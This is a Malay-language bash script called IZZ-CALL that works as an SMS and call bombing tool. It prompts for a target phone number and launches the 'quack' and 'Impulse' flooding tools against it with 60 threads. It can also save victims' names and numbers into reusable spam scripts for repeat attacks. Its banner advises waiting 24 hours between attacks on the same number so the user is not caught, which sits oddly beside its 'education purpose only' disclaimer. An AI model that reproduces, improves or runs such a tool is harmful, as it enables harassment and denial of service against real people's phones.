#!/bin/bash
#
#
# [Open Source] - [IzzSecurity]
#
# Variables Colour
#
PWD=$(pwd)
OS=$(uname -o)
USER=$(id -u)
verde='\033[32m'
blanco='\033[37m'
rojo='\033[31m'
azul='\033[34m'
negro='\033[0;30m'
rosa='\033[38;5;207m'
amarillo='\033[33m'
morado='\033[35m'
cian='\033[1;36m'
magenta='\033[1;35m'
#
# Bahagian Salah
#
function Error {
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}PILIHAN SALAH! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
}
#
# Banner IZZCALL
#
function IZZCALL {
	sleep 0.5
	clear
echo -e "${verde}


██╗███████╗███████╗      ██████╗ █████╗ ██╗     ██╗
██║╚══███╔╝╚══███╔╝     ██╔════╝██╔══██╗██║     ██║
██║  ███╔╝   ███╔╝█████╗██║     ███████║██║     ██║
██║ ███╔╝   ███╔╝ ╚════╝██║     ██╔══██║██║     ██║
██║███████╗███████╗     ╚██████╗██║  ██║███████╗███████╗
╚═╝╚══════╝╚══════╝      ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝"${blanco}
}
#
# Function
#
function PhoneNumber {
IZZCALL
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}MASUKKAN NOMBOR TARGET ${verde}█
└════════════════════════════┘
┃    ┌═════════┐  ┌═══════════════┐
└═>>>█ ${blanco}CONTOH ${verde}█=>█ ${azul}+601234567890 ${verde}█
┃    └═════════┘  └═══════════════┘
┃    ┌════════════════════════════════════════┐
└═>>>█ ${rojo}SAVE NOMBOR ${verde}█
┃    └════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r PHONE
sleep 0.5

echo -e "${verde}
           ┌═════════════════┐
           █ ${azul}NOMBOR DISIMPAN ${verde}█
           └═════════════════┘
   ┌═════════════════════════════════┐
   █ ${blanco}JIKA ANDA SUDAH MENGGUNKAN      ${verde}█
   █ ${blanco}TOOLS INI PADA NOMBOR TELEFON   ${verde}█
   █ ${blanco}ANDA HARUS TUNGGU 24 JAM UNTUK  ${verde}█
   █ ${blanco}MENGGUNAKAN LAGI DALAM NOMBOR   ${verde}█
   █ ${blanco}YANG SAMA.GUNAKANLAH TOOLS INI  ${verde}█
   █ ${blanco}DENGAN BIJAK KALAU TANAK KENA   ${verde}█
   █ ${blanco}TANGKAP.USE FOR EDUCATION AND   ${verde}█
   █ ${blanco}PURPOSE ONLY.TERIMA KASIH.      ${verde}█
   └═════════════════════════════════┘
 ┌══════════════════════════════════════┐
 █ ${rojo}SPAM CALL BOLEH HILANG DARI 2 HINGGA 3  ${verde}█
 █ ${rojo}MINIT,ANDA BOLEH MEMBATALKAN PROSES     ${verde}█
 █ ${rojo}SPAM DENGAN MENGGUNKAN CODE DI BAWAH    ${verde}█
 █ ${rojo}TERIMA KASIH...                         ${verde}█
 └══════════════════════════════════════┘
            ┌══════┐   ┌═══┐
            █ ${azul}CTRL ${verde}█ + █ ${azul}C ${verde}█
            └══════┘   └═══┘
┌═════════════════════════════════════════┐
█ ${blanco}PLEASE ENTER TO CONTINUE SPAM CALL ${verde}█
└═════════════════════════════════════════┘
"${blanco}
read
}
#
# Bahagian Quack
#
function SendSMS {
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}
}
function Backup {
IZZCALL
echo -e -n "${verde}
┌════════════════════════════════════┐
█ ${blanco}SIMPAN NOMBOR DALAM SENARAI HITAM ? ${verde}█
└════════════════════════════════════┘
┃
└═>>> ┃${azul} ${PHONE} ${verde}┃
┃
┃    ┌═══════════════════┐
└═>>>█ [${blanco}01${verde}] ┃ ${blanco}YA SIMPAN ${verde}█
┃    └═══════════════════┘
┃    ┌═══════════════════┐
└═>>>█ [${blanco}02${verde}] ┃ ${blanco}TIDAK SIMPANR ${verde}█
┃    └═══════════════════┘
┃
└═>>> "${blanco}
read -r SCRIPT
sleep 0.5

if [[ ${SCRIPT} == 1 || ${SCRIPT} == 01 ]]; then
echo -e -n "${verde}
┌══════════════════════════════════┐
█ ${blanco}MASUKKAN NAMA UNTUK NOMBOR ANDA ${verde}█
└══════════════════════════════════┘
┃    ┌═════════┐  ┌═════════┐
└═>>>█ ${blanco}CONTOH ${verde}█=>█ ${azul}Pak Samad ${verde}█
┃    └═════════┘  └═════════┘
┃
└═>>> "${blanco}
read -r NAME
sleep 0.5
echo -e "PHONE='${PHONE}'" >> ${RUTA}/tools/list.sh
echo -e "NAME='${NAME}'" >> ${RUTA}/tools/list.sh
echo -e 'echo -e "${blanco}${NAME} ${verde}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/list.sh
echo -e "PHONE='${PHONE}'" >> ${RUTA}/tools/spam.sh
echo -e "NAME='${NAME}'" >> ${RUTA}/tools/spam.sh
echo -e 'echo -e "${verde}
┌══════════┐
█ ${blanco}OBJECTIVE ${verde}█
└══════════┘
${blanco}
${NAME} ${verde}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/spam.sh
echo -e "source ${RUTA}/numbers/${NAME}.sh" >> ${RUTA}/tools/spam.sh
echo -e "#!/bin/bash
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}" >> ${RUTA}/numbers/${NAME}.sh
echo -e "${verde}
┌══════════════════════════════┐
█ ${blanco}NOMBOR DISIMPAN DALAM SKRIP ${verde}█
└══════════════════════════════┘
┃
└═>>>${blanco} ${RUTA}/numbers/${NAME}.sh"${blanco}
elif [[ ${SCRIPT} == 2 || ${SCRIPT} == 02 ]]; then
exit
else
Error
Backup
fi
}
#
# Menu
#
function Restart {
echo -e "${verde}
┌════════════════════════════┐
█ ${blanco}ENTER TO CONTINUE ${verde}█
└════════════════════════════┘"${blanco}
read
source ${RUTA}/IZZCALL.sh
}
#
# Function
#
PhoneNumber
SendSMS
Backup
Restart
